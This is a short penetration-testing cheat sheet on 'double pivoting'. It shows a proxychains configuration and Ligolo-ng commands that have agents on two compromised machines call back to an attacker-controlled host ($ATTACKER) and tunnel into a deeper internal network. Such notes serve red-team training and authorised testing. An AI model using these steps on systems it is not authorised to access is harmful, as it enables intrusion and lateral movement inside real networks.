# Double Pivot

Double pivot AKA double proxy is used when we are trying to connect deeper into another network that is not visible to us via another internal network

##### /etc/proxychains.conf

##### Ensure dynamic_chain is uncommented

    dynamic_chain
    proxy_dns 
    tcp_read_time_out 15000
    tcp_connect_time_out 8000
    socks5  127.0.0.1 1080  # First Pivot
    socks5  127.0.0.1 1081  # Second Pivot

## Ligolo-ng

This case is useful when you compromised a first target that can contact your server, and you have also compromised a second machine that is able to contact your first target, and another network, which is the final goal. And this second machine is not able to contact your server.

### 1) On the attacker machine, start the listener

##### Automatically request LetsEncrypt certificates or use self-signed certificates

    ./proxy [-autocert | -selfcert] -laddr 0.0.0.0:443

### 2) On the first pivot machine, start the agent

    ./agent -connect $ATTACKER:443 [-ignore-cert]

### 3) Then, on the server select the opened session and start a new listener

    ligolo-ng » session
    [Agent : $SESSION] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:11601

The first agent will listen on 0.0.0.0:1080
Any connections on this ip:port will be relayed to the 11601 TCP local port of the Ligolo-ng daemon.

### 4) Then, on the second pivot machine, run the agent and connect it to the first agent

    ./agent -connect $firstPivot:1080 [-ignore-cert]

A second session will appear on the server. Select it, and run the autoroute command. You can now access the final network.
